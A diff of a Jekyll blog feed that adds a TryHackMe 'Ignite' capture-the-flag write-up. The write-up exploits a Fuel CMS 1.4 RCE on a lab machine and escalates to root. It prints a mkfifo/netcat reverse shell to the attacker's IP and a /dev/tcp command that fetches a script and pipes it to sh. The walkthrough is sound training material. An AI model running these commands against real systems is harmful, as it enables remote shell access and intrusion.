@@ -1,4 +1,136 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-03-19T16:50:10+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><entry><title type="html">TryHackMe - Mustacchio</title><link href="http://localhost:4000/tryhackme-mustacchio/" rel="alternate" type="text/html" title="TryHackMe - Mustacchio" /><published>2023-03-19T00:00:00+03:00</published><updated>2023-03-19T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-mustacchio</id><content type="html" xml:base="http://localhost:4000/tryhackme-mustacchio/"><![CDATA[<p>Easy boot2root Machine. Let’s start.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-03-20T16:24:41+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><entry><title type="html">TryHackMe - Ignite</title><link href="http://localhost:4000/tryhackme-ignite/" rel="alternate" type="text/html" title="TryHackMe - Ignite" /><published>2023-03-20T00:00:00+03:00</published><updated>2023-03-20T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-ignite</id><content type="html" xml:base="http://localhost:4000/tryhackme-ignite/"><![CDATA[<p>A new start-up has a few issues with their web server.. Let’s start.</p>
+
+<p><br /></p>
+
+<h2 id="1-ignite">1. Ignite</h2>
+
+<p>Root the box! Designed and created by DarkStar7471, built by Paradox.
+Enjoy the room! For future rooms and write-ups, follow @darkstar7471 on Twitter.</p>
+
+<p><br /></p>
+
+<h3 id="11-usertxt">1.1 User.txt</h3>
+
+<p>Let’s do a nmap scan first.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV -A -O 10.10.80.114
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/ignite/nmap.png" alt="nmap" /></p>
+
+<p>Only port 80/tcp is open. If we look carefully, there is a directory information in <strong><code class="language-plaintext highlighter-rouge">robots.txt</code></strong>. Disallow: <strong><code class="language-plaintext highlighter-rouge">/fuel/</code></strong>.</p>
+
+<p><img src="/assets/img/tryhackme/ignite/robots.png" alt="robots" /></p>
+
+<p>But first, let’s check the website running on port 80. 
+Here is a page like this.</p>
+
+<p><img src="/assets/img/tryhackme/ignite/home.png" alt="home" /></p>
+
+<p>As far as I can see, the fuel cms version 1.4 is used here.
+There may be a vulnerability in this version, we will check it, but first I want to look at the /fuel/ directory.
+Let’s go to this directory and see what comes up.</p>
+
+<p><img src="/assets/img/tryhackme/ignite/login.png" alt="login" /></p>
+
+<p>An admin login page appears. By default I tried <strong><code class="language-plaintext highlighter-rouge">admin:admin</code></strong> directly and logged in D:
+I didn’t expect the admin page to be so easy to reach. Let’s see what we find here.</p>
+
+<p><img src="/assets/img/tryhackme/ignite/fuel.png" alt="fuel" /></p>
+
+<p>I’m checking every link on the page to see if we can somehow apply a reverse shell.
+But I couldn’t find anything remarkable. So I searched in exploit-db if we can find a vulnerability about fuel cms v1.4 that we discovered earlier.</p>
+
+<p><img src="/assets/img/tryhackme/ignite/search.png" alt="search" /></p>
+
+<p>We found something important here. I see that we can exploit the RCE vulnerability in 1.4. Let’s take a look at the most recent of them.</p>
+
+<p><img src="/assets/img/tryhackme/ignite/db.png" alt="db" /></p>
+
+<p>I’m downloading the exploit file from here. And now let’s run it.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python 50477.py -u http://10.10.9.177
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/ignite/payload.png" alt="payload" /></p>
+
+<p>We log in to the system, and we provide a clearer connection by using one of the <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentest monkey’s reverse shells</a>.</p>
+
+<p><img src="/assets/img/tryhackme/ignite/monkey.png" alt="monkey" /></p>
+
+<p>First, we set up a netcat listener on our own machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
+</code></pre></div></div>
+
+<p>Then we enter the following code on the target machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.86.168 4444 &gt;/tmp/f
+</code></pre></div></div>
+
+<p>And we are inside.</p>
+
+<p><img src="/assets/img/tryhackme/ignite/in.png" alt="in" /></p>
+
+<p>To find user.txt, I first look at the user directories in the /home directory. There is a user and that is www-data. We go in and take the flag right away.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ls -la /home
+$ ls -la /home/www-data
+$ cat /home/www-data/user.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/ignite/user-flag.png" alt="user-flag" /></p>
+
+<p><br /></p>
+
+<h3 id="12-roottxt">1.2 Root.txt</h3>
+
+<p>I’m scanning the system with <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20230319">linpeas.sh</a> to upgrade privileges.</p>
+
+<p>First, I run the following code in the directory where linpeas.sh is located on my own machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo nc -q 5 -lvnp 80 &lt; linpeas.sh
+</code></pre></div></div>
+
+<p>Then I run the following code on the target machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat &lt; /dev/tcp/10.8.86.168/80 | sh
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/ignite/run.png" alt="run" /></p>
+
+<p>And it worked. Now we’re waiting to see if we can find anything useful.</p>
+
+<p><img src="/assets/img/tryhackme/ignite/linpeas.png" alt="linpeas" /></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">Password: mememe</code></strong></p>
+
+<p>We found a password information, but I don’t know what it is for. But let’s try it for root.</p>
+
+<p>First, let’s call a shell using python. Then let’s try logging in.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python -c 'import pty; pty.spawn("/bin/bash")'
+$ su root
+Password: mememe
+</code></pre></div></div>
+
+<p>It worked :D. We have successfully rooted.</p>
+
+<p><img src="/assets/img/tryhackme/ignite/privesc.png" alt="privesc" /></p>
+
+<p>Now we can get to root.txt let’s get the flag.</p>
+
+<p><img src="/assets/img/tryhackme/ignite/root-flag.png" alt="root-flag" /></p>
+
+<p><br /></p>
+
+<hr />
+
+<p><br /></p>
+
+<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
+
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="ctf," /><category term="privesc," /><category term="exploit" /><summary type="html"><![CDATA[A new start-up has a few issues with their web server.. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/ignite.png" /><media:content medium="image" url="http://localhost:4000/assets/img/ignite.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Mustacchio</title><link href="http://localhost:4000/tryhackme-mustacchio/" rel="alternate" type="text/html" title="TryHackMe - Mustacchio" /><published>2023-03-19T00:00:00+03:00</published><updated>2023-03-19T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-mustacchio</id><content type="html" xml:base="http://localhost:4000/tryhackme-mustacchio/"><![CDATA[<p>Easy boot2root Machine. Let’s start.</p>
 
 <p><br /></p>
 
@@ -14,7 +146,7 @@
 
 <p>Let’s do a <code class="language-plaintext highlighter-rouge">nmap</code> scan first.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV 10.10.80.114
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV -p- 10.10.80.114
 </code></pre></div></div>
 
 <p><img src="/assets/img/tryhackme/mustacchio/nmap.png" alt="nmap" /></p>
@@ -221,7 +353,7 @@ But now we can get to root.txt.</p>
 
 <p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
 
-<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><summary type="html"><![CDATA[Easy boot2root Machine. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/mustacchio.png" /><media:content medium="image" url="http://localhost:4000/assets/img/mustacchio.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Relevant</title><link href="http://localhost:4000/tryhackme-relevant/" rel="alternate" type="text/html" title="TryHackMe - Relevant" /><published>2023-03-18T00:00:00+03:00</published><updated>2023-03-18T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-relevant</id><content type="html" xml:base="http://localhost:4000/tryhackme-relevant/"><![CDATA[<p>Relevant is a medium challenge from TryHackMe. There are some ways to complete this machine. I’ll solve it one way. Let’s start.</p>
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="xxe," /><category term="privesc," /><category term="enumeraton" /><summary type="html"><![CDATA[Easy boot2root Machine. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/mustacchio.png" /><media:content medium="image" url="http://localhost:4000/assets/img/mustacchio.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Relevant</title><link href="http://localhost:4000/tryhackme-relevant/" rel="alternate" type="text/html" title="TryHackMe - Relevant" /><published>2023-03-18T00:00:00+03:00</published><updated>2023-03-18T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-relevant</id><content type="html" xml:base="http://localhost:4000/tryhackme-relevant/"><![CDATA[<p>Relevant is a medium challenge from TryHackMe. There are some ways to complete this machine. I’ll solve it one way. Let’s start.</p>
 
 <p><br /></p>
 
